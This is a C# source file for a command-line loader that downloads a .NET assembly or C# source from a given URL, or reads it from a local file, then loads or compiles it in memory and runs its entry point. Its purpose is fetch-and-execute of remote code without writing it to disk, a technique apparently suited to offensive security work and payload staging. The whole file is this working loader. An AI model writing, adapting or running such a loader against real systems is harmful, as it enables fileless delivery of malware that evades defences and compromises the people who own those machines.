using System;
using System.IO;
using System.Text;
using System.Net;
using Microsoft.CSharp;
using System.CodeDom.Compiler;
public class Program
{
    public static void Main(string[] args)
    {
        if (args.Length == 0) {
            // If there is no argument, say something nice. 
            Console.WriteLine(@"Use the following syntax:
            url asm http://URL 
            url src http://URL 
            file asm FULLPATH 
            file src FULLPATH");             
        }
        else {                
            // Create the Web Client
            WebClient client = new WebClient();

            // Initiate a variable for .NET assembly 
            byte[] asm = new byte[] {};
            // Initiate a variable for .NET source 
            string src = "" ;
            switch (args[0])
                {
                    case "url":
                        if (args[1] == "asm") {
                            Console.WriteLine("Downloading the .NET assembly.");
                            // Download the .NET assembly from a URL as data
                            asm = client.DownloadData(args[2]);
                            // Call the .NET assembly execution for the data
                            ExecDotNetAssembly(asm);
                        }
                        else
                        {
                            Console.WriteLine("Downloading the .NET source.");
                            // Download the .NET source from a URL as string
                            src = client.DownloadString(args[2]);
                            // Call the .NET DOM compiler for the string
                            CompileDotNetSource(src);
                        }
                        break;                        
                    case "file":
                        if (args[1] == "asm") {
                            Console.WriteLine("Reading the .NET assembly.");
                            // Read a file content for the .NET Assembly
                            asm = File.ReadAllBytes(args[2]);
                            // Call the .NET assembly execution for the data
                            ExecDotNetAssembly(asm);
                        }
                        else
                        {
                            Console.WriteLine("Downloading the .NET source.");
                            // Download the .NET source from a URL as string
                            src = File.ReadAllText(args[2]);
                            // Call the .NET DOM compiler for the string
                            CompileDotNetSource(src);
                        }
                        break;   
                    default:
                        Console.WriteLine(@"Use the following syntax:
                        url asm http://URL
                        url src http://URL
                        file asm FULLPATH
                        file src FULLPATH");                         
                        break;
                }
        }
        return;
    }
    static void CompileDotNetSource(string src)
    {
        // Define the provider and parameters
        CSharpCodeProvider provider = new CSharpCodeProvider();
        CompilerParameters parameters = new CompilerParameters();        
        // If there are other .NET Assemblies required, add here
        parameters.ReferencedAssemblies.Add("System.dll");
        parameters.GenerateInMemory = true;
        parameters.GenerateExecutable = true;
        // Compile the .NET source code                
        CompilerResults results = provider.CompileAssemblyFromSource(parameters, src);
        // Print error details if it fails                        
        if (results.Errors.HasErrors)
            Console.WriteLine("I'm sorry master Wayne, I've failed you.");
        // Get the compiled .NET Assembly
        System.Reflection.Assembly a = results.CompiledAssembly;
        // Finding the Entry Point
        System.Reflection.MethodInfo method = a.EntryPoint;
        // Create the Instance for the Entry Point
        object o = a.CreateInstance(method.Name);
        // Setting the parameters for Invoke
        //object[] apo= { PARAMETERS };            
        object[] apo= { };   
        // Invoking the Entry Point
        method.Invoke(o,apo);                     
        return;
    }

    static void ExecDotNetAssembly(byte[] asm)
    {
        // Loading the .NET Assembly
        System.Reflection.Assembly a = System.Reflection.Assembly.Load(asm);
        // Finding the Entry Point
        System.Reflection.MethodInfo method = a.EntryPoint;
        // Create the Instance for the Entry Point
        object o = a.CreateInstance(method.Name);
        // Setting the parameters for Invoke
        //object[] apo= { PARAMETERS };            
        object[] apo= { };
        // Invoking the Entry Point
        method.Invoke(o,apo);
        return;
    }

}

